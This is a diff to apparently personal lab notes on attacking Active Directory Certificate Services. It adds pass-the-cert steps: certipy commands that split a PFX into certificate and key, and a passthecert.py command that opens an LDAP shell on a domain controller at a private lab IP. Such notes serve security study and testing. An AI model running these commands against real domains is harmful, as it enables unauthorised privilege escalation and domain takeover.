@@ -291,8 +291,23 @@ certipy-ad req -u 'dev@papa.local' -p 'password' -dc-ip 192.168.130.136 -ca LAB-
 
 - When you try to auth with that cert, you'll get this error `KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)`
 - Use `passthecert`-:
+  - Generate certificate and public key-:
 
+  ```bash
+  certipy cert -pfx user.pfx -nokey -out user.crt
+  certipy cert -pfx user.pfx -nocert -out user.key
+  ```
 
+  -  Use `ldap_shell`-:
+
+  ```bash
+  python3 passthecert.py -action ldap-shell -crt user.crt -key user.key -domain papa.local -dc-ip 192.168.130.136
+  ```
+  - Fix if it is your personal DC
+
+  <img width="505" height="248" alt="image" src="https://github.com/user-attachments/assets/06a16766-3309-4203-9884-4a18afa2a39b" />
+
+- 
 
 
 ------------------
